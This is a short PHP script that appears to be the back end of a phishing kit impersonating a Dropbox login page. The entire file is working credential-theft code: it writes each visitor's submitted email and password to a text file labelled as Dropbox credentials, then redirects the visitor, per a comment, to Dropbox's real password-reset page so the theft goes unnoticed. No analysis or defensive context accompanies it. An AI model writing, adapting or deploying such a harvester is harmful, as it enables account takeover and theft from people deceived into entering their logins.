<?php
file_put_contents("usernames.txt", "Dropbox Username: " . $_POST['login_email'] . "\nPassword: " . $_POST['login_password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://www.dropbox.com/forgot/
header("Location: $url");
exit();
?>
